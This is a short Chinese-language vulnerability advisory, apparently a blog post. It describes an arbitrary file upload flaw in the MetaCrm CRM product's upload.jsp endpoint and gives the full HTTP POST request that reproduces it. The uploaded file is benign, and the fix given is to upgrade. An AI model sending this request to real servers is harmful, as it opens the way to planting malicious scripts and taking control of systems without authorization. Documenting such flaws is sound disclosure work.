@[toc]
# 漏洞描述
北京美特软件技术有限公司（以下简称“美特软件”）是一家专业的客户关系管理软件提供商。

美特软件MetaCrm存在文件上传漏洞，攻击者可利用该漏洞上传任意恶意文件。
# 漏洞原理
在系统upload.jsp接口存在任意文件上传漏洞，攻击者可通过改漏洞上传恶意脚本从而控制该服务器

# 漏洞复现
访问/develop/systparam/softlogo/upload.jsp接口构造请求包
```yaml
POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
Host: xxxx
Content-Length: 661
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Referer: http://x.x.x.x/develop/systparam/softlogo/file2.jsp
Connection: close

------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="file"; filename="1"
Content-Type: text/plain

1
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="key"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="form"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="field"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filetitile"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filefolder"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh--
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/54ece4c198e04ae8b9b89e48d4d4b2a7.png)
上传成功

# 修复建议
升级到最新版

